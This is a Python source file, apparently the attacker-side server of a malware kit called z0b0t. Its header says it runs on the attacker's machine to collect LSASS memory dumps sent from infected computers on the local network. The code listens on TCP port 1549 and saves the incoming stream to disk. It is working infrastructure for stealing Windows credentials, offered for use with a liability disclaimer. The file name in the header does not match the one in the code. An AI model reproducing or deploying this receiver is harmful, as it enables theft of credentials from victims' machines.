# NAME: z0b0tServer.py
# PURPOSE: Executed on the attackers computer to receive the dumped file
# PREREQUISITES: None, can be run whenever; it will not do anything until it times out (which takes a long time) or a connection is received
# EXTRA INFO: The dumped info will be located in the same directory as this file after a successful execution; it should have the name lsass_72.dmp
#             This server will only receive requests from infected computers on the same local network; it will not receive requests from remote clients
#             I am not liable for any damages done through the use or modification of this program; with that being said, use it at your own risk.


import socket
from sys import exit

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# MAIN METHOD
def main():                                                              
	
	print(" ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ")
	print("▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░▌  ▐░░░░░░░░░▌▐░░░░░░░░░░░▌")
	print(" ▀▀▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▀▀▀▀█░█▀▀▀▀ ")
	print("          ▐░▌▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌    ▐░▌     ")
	print(" ▄▄▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌    ▐░▌     ")
	print("▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░▌ ▐░▌  ▐░▌  ▐░▌    ▐░▌     ")
	print("▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌    ▐░▌     ")
	print("▐░▌          ▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌    ▐░▌     ")
	print("▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌    ▐░▌     ")
	print("▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░▌  ▐░░░░░░░░░▌     ▐░▌     ")
	print(" ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀       ▀      \n\n")
                                                                

	establishServer()
	recvInfo()
	server.close()
	print('\t~ Connection closed - thank you for using the z0b0t client!')
	exit(0)

def establishServer():
	# specify host and port
	host = '0.0.0.0'
	port = 1549 # runs on port 1549
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	# bind to the port
	server.bind((host, port))

	# queue up to 2 requests
	server.listen(2)
	print('\t~ Server listening...')

def recvInfo():
	# connection established
	clientSocket,addr = server.accept()
	print("\t~ Got a connection from %s\n" % str(addr))

	received_file = "lsass_76.dmp"

	with open(received_file, 'wb') as f:
		print('\t~ Local output file opened! Receiving data...')
		data = clientSocket.recv(1024)
		while data:
			if not data:
				break
			f.write(data) # write data to file
			data = clientSocket.recv(1024)

	f.close() # close file
	print('\t~ Successfully got the file contents! The data is in %s within the directory this file was stored in!\n' % str(received_file))

main()
